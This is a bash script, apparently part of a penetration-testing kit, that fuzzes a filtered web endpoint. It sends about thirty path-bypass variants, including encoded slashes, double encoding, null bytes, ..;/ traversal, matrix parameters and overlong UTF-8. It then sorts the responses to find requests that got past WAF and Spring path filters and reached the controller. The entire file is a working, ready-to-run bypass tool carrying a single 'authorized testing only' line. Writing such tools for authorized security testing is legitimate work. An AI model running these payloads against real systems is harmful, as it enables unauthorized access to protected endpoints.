#!/usr/bin/env bash
# path-bypass-fuzzer.sh — Test a patched/filtered endpoint against the full
# 20+ variant path-normalization / encoding / case ladder. Buckets results so
# you can tell at a glance: did the WAF reject (403), did Spring reject (400),
# did we reach the SPA handler (200 HTML), or did we hit the controller (200 JSON)?
#
# Usage:
#   ./path-bypass-fuzzer.sh <base_url> <path> [method] [auth_header]
#
# Example:
#   ./path-bypass-fuzzer.sh https://tenant-001.cdn.acmeauth.example /cc/api/idp/integration/enablement GET "Authorization: Bearer hypwo-..."
#
# Authorized testing only. Read references/ethics-and-roe.md first.

set -uo pipefail

if [[ $# -lt 2 ]]; then
  echo "Usage: $0 <base_url> <path> [method] [auth_header]"
  echo "Example: $0 https://tenant-001.cdn.acmeauth.example /cc/api/idp/integration/enablement GET 'Authorization: Bearer hypwo-...'"
  exit 1
fi

BASE_URL="$1"; shift
PATH0="$1"; shift
METHOD="${1:-GET}"; shift || true
AUTH_HEADER="${1:-}"; shift || true

# Strip trailing slash from base, strip leading slash from path so we can stitch
BASE_URL="${BASE_URL%/}"
P="${PATH0#/}"

CURL_ARGS=(-s -o /tmp/pbf-body -w "%{http_code} %{content_type} %{size_download}")
[[ -n "$AUTH_HEADER" ]] && CURL_ARGS+=(-H "$AUTH_HEADER")

# Variant ladder — matches references/bypass-catalogue.md §A order
# Each entry: label | suffix-or-replacement (the part that replaces $P)
# We stitch together: ${BASE_URL}/${VARIANT}
#
# Note: %2f, %2e etc. must reach the server encoded, so we use --path-as-is via
# --request-target style by passing the full URL and hoping curl doesn't pre-normalize.
# For aggressive encodings, --path-as-is is set globally.

VARIANTS=(
  "baseline|${P}"
  "case-upper|$(echo "$P" | tr 'a-z' 'A-Z')"
  "case-mixed|$(echo "$P" | sed 's/./\U&/3')"
  "trailing-dot|${P}."
  "trailing-slash|${P}/"
  "leading-space|%20${P}"
  "trailing-space|${P}%20"
  "trailing-tab|${P}%09"
  "trailing-null|${P}%00"
  "semicolon|${P};"
  "matrix-json|${P};.json"
  "matrix-jsess|${P};jsessionid=x"
  "at-sep|${P}@"
  "dot-prefix|.${P}"
  "double-slash|/${P}"
  "slash-dot|/./${P}"
  "slash-semicolon|/;/${P}"
  "enc-slash|${P}%2f"
  "enc-dot|${P}%2e"
  "enc-hash|${P}%23"
  "enc-semicolon|${P}%3b"
  "single-char-encode|$(echo "$P" | sed 's/a/%61/' | sed 's/e/%65/')"
  "double-encode-slash|${P}%252f"
  "double-encode-dot|..%252f${P}"
  "traversal-back|/aaa/../${P}"
  "traversal-semicolon|/cc/..;/${P}"
  "traversal-enc|${P}/..; /"
  "suffix-json|${P}.json"
  "suffix-html|${P}.html"
  "overlong-utf8|${P}%c0%af.."
  "fullwidth-slash|${P}%ef%bc%8f"
)

printf "%-25s %-8s %-30s %-12s %s\n" "VARIANT" "STATUS" "CONTENT-TYPE" "SIZE" "VERDICT"
printf "%-25s %-8s %-30s %-12s %s\n" "-------" "------" "------------" "----" "------"

for entry in "${VARIANTS[@]}"; do
  label="${entry%%|*}"
  variant="${entry#*|}"
  url="${BASE_URL}/${variant}"

  # Use --path-as-is to prevent curl from normalizing ../ etc.
  read -r code ctype size < <(curl --path-as-is "${CURL_ARGS[@]}" -X "$METHOD" "$url")

  # Verdict heuristic
  verdict="?"
  if [[ "$code" == "403" ]]; then
    if grep -q "Ensure the URL is valid" /tmp/pbf-body 2>/dev/null; then
      verdict="WAF-BLOCK"
    else
      verdict="403"
    fi
  elif [[ "$code" == "401" ]]; then
    verdict="AUTH-WALL"
  elif [[ "$code" == "404" ]]; then
    verdict="NOT-FOUND"
  elif [[ "$code" == "400" ]]; then
    verdict="SPRING-400"
  elif [[ "$code" == "405" ]]; then
    verdict="SPA-FALLBACK"   # GET-only static handler
  elif [[ "$code" == "200" ]]; then
    if [[ "$ctype" == text/html* ]]; then
      verdict="SPA-FALLBACK" # Angular index.html
    elif [[ "$ctype" == application/json* ]]; then
      verdict="CONTROLLER-200"   # <- this is the dangerous one
    else
      verdict="200-${ctype}"
    fi
  elif [[ "$code" == "500" ]]; then
    verdict="SERVER-ERR"
  fi

  printf "%-25s %-8s %-30s %-12s %s\n" "$label" "$code" "${ctype:0:30}" "$size" "$verdict"
done

echo ""
echo "Body of last response (for inspection):"
echo "  /tmp/pbf-body"
echo ""
echo "VERDICT KEY:"
echo "  WAF-BLOCK      = path filter rejected (403 + 'Ensure the URL is valid'). Did NOT reach controller."
echo "  AUTH-WALL      = 401 — token rejected at auth layer."
echo "  NOT-FOUND      = 404 — no route."
echo "  SPRING-400     = Spring rejected malformed path. Did NOT reach controller logic."
echo "  SPA-FALLBACK   = 200 text/html OR 405 — request fell through to SPA static handler. Case-variant trap."
echo "  CONTROLLER-200 = 200 JSON — REACHED CONTROLLER. Investigate."
echo "  SERVER-ERR     = 500 — uncaught exception. May indicate reachable-but-buggy code path."
